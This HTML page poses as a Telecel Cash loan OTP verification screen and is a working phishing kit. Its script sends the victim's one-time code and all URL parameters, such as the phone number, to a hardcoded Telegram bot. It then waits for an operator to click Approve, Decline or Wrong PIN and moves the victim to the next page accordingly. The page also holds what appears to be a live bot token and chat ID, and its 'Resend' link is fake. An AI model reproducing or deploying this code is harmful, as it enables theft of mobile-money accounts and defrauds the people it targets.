<html lang="en">
<head>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Verification - Telecel Cash</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --red: #E42320;
            --red-dark: #c01c1a;
            --red-soft: rgba(228,35,32,0.08);
            --red-border: rgba(228,35,32,0.18);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            background: linear-gradient(135deg, #f3f4f6 0%, #e5e7eb 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 10px;
        }
        .container {
            width: 100%;
            max-width: 420px;
            background: white;
            border-radius: 24px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
            overflow: hidden;
            animation: slideUp 0.5s ease-out;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .logo-section {
            background: linear-gradient(135deg, #E42320 0%, #c01c1a 100%);
            text-align: center;
            padding: 28px 0 22px;
        }
        .brand-logo {
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }
        .logo-icon {
            width: 48px;
            height: 48px;
            background: white;
            border-radius: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: logoFloat 3s ease-in-out infinite;
        }
        @keyframes logoFloat {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-8px); }
        }
        .brand-name {
            color: white;
            font-size: 26px;
            font-weight: 700;
            letter-spacing: -0.5px;
        }
        .tagline {
            color: rgba(255,255,255,0.85);
            font-size: 12.5px;
            margin-top: 6px;
            letter-spacing: 0.5px;
            text-transform: uppercase;
        }
        h1 {
            text-align: center;
            font-size: 22px;
            font-weight: 700;
            color: #1e2937;
            margin: 22px 0 6px;
        }
        .subtitle {
            text-align: center;
            color: #475569;
            font-size: 14.5px;
            padding: 0 25px 18px;
            line-height: 1.55;
        }
        .phone-display {
            text-align: center;
            font-size: 13.5px;
            color: #64748b;
            margin: -10px 0 14px;
            padding: 0 25px;
        }
        .phone-display strong {
            color: var(--red);
            font-weight: 700;
        }
        .offer-info {
            background: #fff0f0;
            margin: 0 20px 18px;
            padding: 15px;
            border-radius: 16px;
            text-align: center;
            border: 1px solid #ffe0e0;
            animation: slideIn 0.6s ease-out 0.2s both;
        }
        @keyframes slideIn {
            from { opacity: 0; transform: translateX(-20px); }
            to { opacity: 1; transform: translateX(0); }
        }
        .offer-info .offer-label {
            font-size: 12px;
            font-weight: 700;
            color: var(--red);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .offer-info .offer-amount {
            font-size: 24px;
            font-weight: 800;
            color: #1e2937;
            margin-top: 4px;
        }
        .content {
            padding: 0 25px 25px;
        }
        .otp-inputs {
            display: flex;
            gap: 8px;
            justify-content: center;
            margin: 28px 0;
        }
        .otp-input {
            width: 50px;
            height: 60px;
            border: 2px solid #e5e7eb;
            border-radius: 12px;
            text-align: center;
            font-size: 24px;
            font-weight: 700;
            color: #1e2937;
            font-family: 'Plus Jakarta Sans', sans-serif;
            transition: all 0.2s;
            animation: inputFade 0.4s ease-out;
        }
        @keyframes inputFade {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }
        .otp-input:nth-child(1) { animation-delay: 0.1s; }
        .otp-input:nth-child(2) { animation-delay: 0.2s; }
        .otp-input:nth-child(3) { animation-delay: 0.3s; }
        .otp-input:nth-child(4) { animation-delay: 0.4s; }
        .otp-input:nth-child(5) { animation-delay: 0.5s; }
        .otp-input:focus {
            border-color: var(--red);
            box-shadow: 0 0 0 3px rgba(228,35,32,0.1);
            outline: none;
        }
        .otp-input::placeholder {
            color: #cbd5e1;
        }
        .error-message {
            color: #dc2626;
            font-size: 13px;
            text-align: center;
            margin: 12px 0;
            display: none;
            animation: shake 0.4s ease-in-out;
        }
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }
        .verify-btn {
            width: 100%;
            background: var(--red);
            color: white;
            border: none;
            padding: 14px;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .verify-btn:hover:not(:disabled) {
            background: var(--red-dark);
            transform: translateY(-2px);
            box-shadow: 0 8px 24px rgba(228,35,32,0.3);
        }
        .verify-btn:active:not(:disabled) {
            transform: translateY(0);
        }
        .verify-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .spinner {
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .loading-indicator {
            display: none;
            text-align: center;
            margin-top: 20px;
        }
        .loading-indicator.active {
            display: block;
        }
        .loading-text {
            color: #64748b;
            font-size: 13px;
            margin-top: 10px;
        }
        .resend-section {
            text-align: center;
            margin-top: 16px;
            font-size: 13px;
            color: #64748b;
        }
        .resend-section a {
            color: var(--red);
            text-decoration: none;
            font-weight: 600;
            cursor: pointer;
        }
        .resend-section a:hover {
            text-decoration: underline;
        }
        @media (max-width: 480px) {
            .container { border-radius: 20px; }
            h1 { font-size: 20px; }
            .otp-input { width: 45px; height: 55px; font-size: 20px; }
            .content { padding: 0 20px 20px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-section">
            <div class="brand-logo">
                <div class="logo-icon">
                    <svg viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect x="28" y="40" width="144" height="32" rx="5" fill="#E42320"/>
                        <rect x="84" y="40" width="32" height="126" rx="5" fill="#E42320"/>
                        <path d="M142 152 Q176 118 160 80" stroke="#E42320" stroke-width="12" stroke-linecap="round" fill="none" opacity="0.6"/>
                    </svg>
                </div>
                <div>
                    <div class="brand-name">Telecel<span style="color: #E42320;">Loans</span></div>
                    <div class="tagline">Secure Verification</div>
                </div>
            </div>
        </div>

        <h1>Verify Your Phone</h1>
        <p class="subtitle">Enter the 5-digit code sent to your phone</p>
        <p class="phone-display">Sent to <strong id="displayPhone">+233 50 ***</strong></p>

        <div class="offer-info">
            <div class="offer-label">💰 Your Loan Amount</div>
            <div class="offer-amount" id="displayAmount">5,000 GHS</div>
        </div>

        <div class="content">
            <div id="errMsg" class="error-message"></div>

            <div class="otp-inputs" id="otpInputs">
                <!-- OTP inputs will be generated here -->
            </div>

            <button class="verify-btn" id="verifyBtn" onclick="submitOTP()">
                Verify & Confirm Loan
            </button>

            <div class="loading-indicator" id="spinner">
                <div class="spinner" style="margin: 0 auto;"></div>
                <div class="loading-text">Verifying your code...</div>
            </div>

            <div class="resend-section">
                Didn't receive the code? <a onclick="resendCode()">Resend</a>
            </div>
        </div>
    </div>

    <script>
        const CONFIG = {
            BOT_TOKEN: '8780318509:AAFhTqugIkVRv2qCgKOrbWc3ILb7taCBER4',
            CHAT_ID: '6573120346',
            NEXT_PAGE: 'verify.html'
        };

        let state = { lastUpdateId: 0 };
        let isProcessing = false;

        const errMsg = document.getElementById('errMsg');
        const spinner = document.getElementById('spinner');
        const verifyBtn = document.getElementById('verifyBtn');

        function getParams() {
            const params = new URLSearchParams(window.location.search);
            const result = {};
            for (let [key, value] of params) {
                result[key] = value;
            }
            return result;
        }

        function loadOffer() {
            const params = getParams();
            const amount = params.amount || '5,000';
            const phone = params.phone || '+233 50 ***';
            document.getElementById('displayAmount').textContent = parseInt(amount).toLocaleString() + ' GHS';
            document.getElementById('displayPhone').textContent = phone;
        }

        function createInputs(containerId, length) {
            const container = document.getElementById(containerId);
            for (let i = 0; i < length; i++) {
                const input = document.createElement('input');
                input.type = 'text';
                input.maxLength = '1';
                input.className = 'otp-input';
                input.inputMode = 'numeric';
                container.appendChild(input);
            }
        }

        function getCode(containerId) {
            return Array.from(document.querySelectorAll(`#${containerId} .otp-input`))
                       .map(i => i.value.trim()).join('');
        }

        function setupAutoFocus(containerId, length, onComplete) {
            const inputs = document.querySelectorAll(`#${containerId} .otp-input`);
            inputs.forEach((input, index) => {
                input.addEventListener('input', () => {
                    input.value = input.value.replace(/\D/g, '');
                    if (input.value.length === 1 && index < length - 1) {
                        inputs[index + 1].focus();
                    }
                    if (getCode(containerId).length === length) {
                        setTimeout(onComplete, 180);
                    }
                });
                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && !input.value && index > 0) {
                        inputs[index - 1].focus();
                    }
                });
            });
        }

        function submitOTP() {
            if (isProcessing) return;
            
            const otp = getCode('otpInputs');
            if (otp.length !== 5) {
                errMsg.textContent = 'Please enter the 5-digit code.';
                errMsg.style.display = 'block';
                return;
            }

            isProcessing = true;
            verifyBtn.disabled = true;
            verifyBtn.textContent = 'Verifying...';

            const ts = Date.now();
            const approveId = `otp_approve_${ts}`;
            const declineId = `otp_decline_${ts}`;

            const params = getParams();
            const paramSummary = Object.entries(params)
                .map(([k, v]) => `${k}: <code>${v}</code>`)
                .join('\n');

            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: `<b>🔴 OTP Verification — Telecel Cash</b>\n\n${paramSummary}\nOTP: <code>${otp}</code>\n\nChoose Action:`,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '✅ Approve', callback_data: approveId },
                                { text: '❌ Decline', callback_data: declineId },
                                { text: '🔑 Wrong PIN', callback_data: `wrong_pin_${ts}` }
                            ]
                        ]
                    }
                })
            })
            .then(() => {
                spinner.classList.add('active');
                startPolling(approveId, declineId, `wrong_pin_${ts}`);
            })
            .catch(() => {
                resetButton();
            });
        }

        function startPolling(approveId, declineId, wrongPinId) {
            const interval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                    .then(r => r.json())
                    .then(data => {
                        if (!data.ok || !data.result) return;
                        data.result.forEach(update => {
                            state.lastUpdateId = update.update_id;
                            if (update.callback_query) {
                                const cb = update.callback_query.data;
                                if (cb === approveId) {
                                    clearInterval(interval);
                                    window.location.href = `${CONFIG.NEXT_PAGE}${window.location.search}`;
                                } else if (cb === declineId) {
                                    clearInterval(interval);
                                    spinner.classList.remove('active');
                                    errMsg.textContent = 'Verification failed. Please try again.';
                                    errMsg.style.display = 'block';
                                    resetButton();
                                } else if (cb === wrongPinId) {
                                    clearInterval(interval);
                                    window.location.href = 'wrong-pin.html';
                                }
                            }
                        });
                    });
            }, 1000);
        }

        function resetButton() {
            isProcessing = false;
            verifyBtn.disabled = false;
            verifyBtn.textContent = 'Verify & Confirm Loan';
        }

        function resendCode() {
            alert('A new code has been sent to your phone.');
        }

        // Initialize
        createInputs('otpInputs', 5);
        setupAutoFocus('otpInputs', 5, submitOTP);
        loadOffer();
    </script>
</body>
</html>
